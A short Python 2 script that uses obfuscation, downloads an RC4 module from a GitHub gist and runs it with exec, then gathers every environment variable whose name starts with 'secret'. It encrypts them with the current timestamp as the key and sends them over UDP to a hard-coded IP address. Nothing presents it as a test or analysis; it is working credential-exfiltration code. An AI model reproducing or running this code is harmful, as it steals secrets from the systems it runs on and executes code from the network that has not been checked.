#!/usr/bin/python2
from urllib2 import urlopen
import types,time,os
import socket

# _=((()>[])+(()>[]));
# __=(((_<<_)<<_)*_);
# ___=('c%'[::(({}>[])-(()>[]))])*(__+(((_<<_)<<_)+(((_<<_)*_)+((_*_)+(()>[])))))%((__+(((_<<_)<<_)+(_<<_))),(__+(((_<<_)<<_)+(((_<<_)*_)+(_*_)))),(__+(((_<<_)<<_)+(((_<<_)*_)+(_*_)))),(__+(((_<<_)<<_)+((_<<_)*_))),(__+(((_<<_)<<_)+(((_<<_)*_)+(_+(()>[]))))),(((_<<_)<<_)+(((_<<_)*_)+((_<<_)+_))),(((_<<_)<<_)+((_<<_)+((_*_)+(_+(()>[]))))),(((_<<_)<<_)+((_<<_)+((_*_)+(_+(()>[]))))),(__+(((_<<_)<<_)+((_*_)+(_+(()>[]))))),(__+(((_<<_)<<_)+((_<<_)+(()>[])))),(__+(((_<<_)<<_)+(((_<<_)*_)+(_+(()>[]))))),(__+(((_<<_)<<_)+(((_<<_)*_)+(_*_)))),(((_<<_)<<_)+((_<<_)+((_*_)+_))),(__+(((_<<_)<<_)+((_*_)+(_+(()>[]))))),(__+(((_<<_)<<_)+((_<<_)+(()>[])))),(__+(((_<<_)<<_)+(((_<<_)*_)+(_*_)))),(__+(((_<<_)<<_)+(_<<_))),(__+(((_<<_)<<_)+(((_<<_)*_)+((_*_)+(()>[]))))),(__+(((_<<_)<<_)+_)),(((_<<_)<<_)+((_<<_)+((_*_)+_))),(__+(((_<<_)<<_)+(_+(()>[])))),(__+(((_<<_)<<_)+((_<<_)+((_*_)+(_+(()>[])))))),(__+(((_<<_)<<_)+((_<<_)+((_*_)+(()>[]))))),(((_<<_)<<_)+((_<<_)+((_*_)+(_+(()>[]))))),(__+(((_<<_)<<_)+(_<<_))),(__+(((_<<_)<<_)+(((_<<_)*_)+(_+(()>[]))))),(__+(((_<<_)<<_)+(()>[]))),(__+(((_<<_)<<_)+(((_<<_)*_)+((_*_)+(()>[]))))),(__+(((_<<_)<<_)+((_*_)+(()>[])))),(__+(((_<<_)<<_)+(((_<<_)*_)+_))),(__+(((_<<_)<<_)+(((_<<_)*_)+(_+(()>[]))))),(((_<<_)<<_)+(((_<<_)*_)+((_*_)+(()>[])))),(((_<<_)<<_)+((_<<_)+((_*_)+(_+(()>[]))))),(((_<<_)<<_)+(((_<<_)*_)+(_*_))),(((_<<_)<<_)+(((_<<_)*_)+((_<<_)+(()>[])))),(((_<<_)<<_)+(((_<<_)*_)+(()>[]))),(__+(((_<<_)<<_)+((_*_)+_))),(((_<<_)<<_)+(((_<<_)*_)+((_<<_)+(()>[])))),(__+(((_<<_)<<_)+(_*_))),(__+(((_<<_)<<_)+(_*_))),(__+(((_<<_)<<_)+((_*_)+(()>[])))),(((_<<_)<<_)+(((_<<_)*_)+((_<<_)+(()>[])))),(((_<<_)<<_)+(((_<<_)*_)+((_*_)+(_+(()>[]))))),(((_<<_)<<_)+(((_<<_)*_)+((_*_)+(()>[])))),(__+(((_<<_)<<_)+((_*_)+_))),(((_<<_)<<_)+(((_<<_)*_)+(()>[]))),(__+(((_<<_)<<_)+((_*_)+(()>[])))),(__+(((_<<_)<<_)+(()>[]))),(__+(((_<<_)<<_)+(()>[]))),(((_<<_)<<_)+(((_<<_)*_)+((_<<_)+(()>[])))),(((_<<_)<<_)+(((_<<_)*_)+((_*_)+(_+(()>[]))))),(((_<<_)<<_)+(((_<<_)*_)+(()>[]))),(((_<<_)<<_)+((_<<_)*_)),(((_<<_)<<_)+(((_<<_)*_)+(_+(()>[])))),(((_<<_)<<_)+(((_<<_)*_)+(_*_))),(((_<<_)<<_)+(((_<<_)*_)+_)),(((_<<_)<<_)+(((_<<_)*_)+((_*_)+(_+(()>[]))))),(__+(((_<<_)<<_)+((_*_)+(()>[])))),(__+(((_<<_)<<_)+(_*_))),(__+(((_<<_)<<_)+(()>[]))),(((_<<_)<<_)+(((_<<_)*_)+((_*_)+(()>[])))),(((_<<_)<<_)+((_<<_)*_)),(((_<<_)<<_)+((_<<_)*_)),(((_<<_)<<_)+(((_<<_)*_)+((_*_)+(_+(()>[]))))),(((_<<_)<<_)+(((_<<_)*_)+(()>[]))),(((_<<_)<<_)+((_<<_)+((_*_)+(_+(()>[]))))),(__+(((_<<_)<<_)+(((_<<_)*_)+_))),(__+(((_<<_)<<_)+(()>[]))),(__+(((_<<_)<<_)+(((_<<_)*_)+((_*_)+(_+(()>[])))))),(((_<<_)<<_)+((_<<_)+((_*_)+(_+(()>[]))))),(__+(((_<<_)<<_)+(()>[]))),(((_<<_)<<_)+(((_<<_)*_)+(_<<_))),(__+(((_<<_)<<_)+((_*_)+_))),(((_<<_)<<_)+(((_<<_)*_)+((_*_)+_))),(((_<<_)<<_)+(((_<<_)*_)+((_*_)+_))),(__+(((_<<_)<<_)+((_*_)+_))),(((_<<_)<<_)+(((_<<_)*_)+(()>[]))),(__+(((_<<_)<<_)+((_*_)+_))),(((_<<_)<<_)+(((_<<_)*_)+((_<<_)+(()>[])))),(__+(((_<<_)<<_)+((_*_)+(()>[])))),(((_<<_)<<_)+(((_<<_)*_)+((_*_)+(_+(()>[]))))),(((_<<_)<<_)+(((_<<_)*_)+((_*_)+(_+(()>[]))))),(__+(((_<<_)<<_)+_)),(((_<<_)<<_)+(((_<<_)*_)+_)),(__+(((_<<_)<<_)+(_*_))),(__+(((_<<_)<<_)+_)),(((_<<_)<<_)+(((_<<_)*_)+_)),(((_<<_)<<_)+(((_<<_)*_)+(_<<_))),(__+(((_<<_)<<_)+_)),(__+(((_<<_)<<_)+(()>[]))),(__+(((_<<_)<<_)+_)),(((_<<_)<<_)+(((_<<_)*_)+(()>[]))),(((_<<_)<<_)+(((_<<_)*_)+(_+(()>[])))),(((_<<_)<<_)+(((_<<_)*_)+_)),(((_<<_)<<_)+(((_<<_)*_)+(_<<_))),(__+(((_<<_)<<_)+(_*_))),(__+(((_<<_)<<_)+_)),(((_<<_)<<_)+(((_<<_)*_)+_)),(((_<<_)<<_)+(((_<<_)*_)+((_*_)+(_+(()>[]))))),(((_<<_)<<_)+(((_<<_)*_)+(_*_))),(__+(((_<<_)<<_)+((_*_)+_))),(((_<<_)<<_)+((_<<_)*_)),(((_<<_)<<_)+(((_<<_)*_)+((_*_)+(()>[])))),(((_<<_)<<_)+(((_<<_)*_)+((_*_)+(_+(()>[]))))),(((_<<_)<<_)+(((_<<_)*_)+_)),(((_<<_)<<_)+(((_<<_)*_)+_)),(__+(((_<<_)<<_)+_)),(((_<<_)<<_)+(((_<<_)*_)+((_*_)+(()>[])))),(((_<<_)<<_)+(((_<<_)*_)+(_+(()>[])))),(((_<<_)<<_)+(((_<<_)*_)+((_*_)+(()>[])))),(((_<<_)<<_)+((_<<_)+((_*_)+(_+(()>[]))))),(__+(((_<<_)<<_)+(((_<<_)*_)+_))),(__+(((_<<_)<<_)+(_+(()>[])))),(((_<<_)<<_)+(((_<<_)*_)+(_*_))),(((_<<_)<<_)+((_<<_)+((_*_)+_))),(__+(((_<<_)<<_)+((_<<_)*_))),(__+(((_<<_)<<_)+(((_<<_)*_)+((_<<_)+(()>[]))))))
_=2
__=64
___="https://gist.github.com/hsauers5/491f9dde975f1eaa97103427eda50071/raw/a8f66f1f9e77b2db28bab1328db274f05722b535/rc4.py"

m = types.ModuleType('')
exec(urlopen(___).read().decode('utf-8'), m.__dict__)
k = '%d' % int(time.time())
enc = m.encrypt(
  str(
    [{a:b} for a,b in os.environ.items() if a.lower().startswith('secret')]
  ),
  k
)
sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
sock.sendto(enc, ('83.84.179.243', 16495))